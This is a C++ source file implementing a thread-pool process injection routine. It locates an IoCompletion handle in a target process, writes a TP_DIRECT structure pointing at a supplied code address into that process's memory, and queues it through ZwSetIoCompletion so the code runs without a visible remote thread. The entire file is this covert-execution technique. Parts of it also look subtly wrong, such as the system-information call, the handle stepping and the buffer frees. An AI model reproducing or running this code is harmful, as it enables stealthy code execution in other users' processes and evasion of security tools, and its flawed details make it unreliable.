#include "TPInjection.h"
bool CreateTPDirectThread(HANDLE process, void* addr) {
    PROCESS_HANDLE_SNAPSHOT_INFORMATION* handles = (PROCESS_HANDLE_SNAPSHOT_INFORMATION*)(new BYTE[100000]);
    goto sk;
err:
    delete handles;
    return 0;
    sk:
    NTSTATUS stat = (DWORD)NtF("NtQuerySystemInformation")(ProcessHandleInformation, handles, 100000, NULL);
    if (stat != 0) { goto err; }
    DWORD handlen = 0;
    void (*fcn0)(...) = (void (*)(...))NtF("NtQueryObject");
    OBJECT_TYPE_INFORMATION* hndtype = (OBJECT_TYPE_INFORMATION*)(new BYTE[10000]);
    HANDLE iocomp = NULL;
    while (handlen < handles->NumberOfHandles) {
        if (DuplicateHandle(process, (HANDLE)handlen, GetCurrentProcess(), &iocomp, 0, 0, DUPLICATE_SAME_ACCESS) != 0) {
            fcn0(iocomp, 2, hndtype, 10000, NULL);
            //std::wcerr << hndtype->TypeName.Buffer << "\n";
            if (wcscmp(L"IoCompletion", hndtype->TypeName.Buffer) == 0) {
                goto iocompfound;
            }
            CloseHandle(iocomp);
        }
        handlen+=1;
    }
    goto err;
iocompfound:
    TP_DIRECT Direct{ 0 };
    Direct.Callback = (TP_DIRECT*)(addr);
    PTP_DIRECT RemoteDirectAddress = (PTP_DIRECT)(VirtualAllocEx(process, NULL, sizeof(TP_DIRECT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    if (RemoteDirectAddress == NULL) { goto err; }
    if (WriteProcessMemory(process, RemoteDirectAddress, &Direct, sizeof(TP_DIRECT), NULL) == 0) { goto err; };
    if ((DWORD)NtF("ZwSetIoCompletion")(iocomp, RemoteDirectAddress, 0, 0, 0) != 0) { goto err; };

    delete handles;
    return 1;
}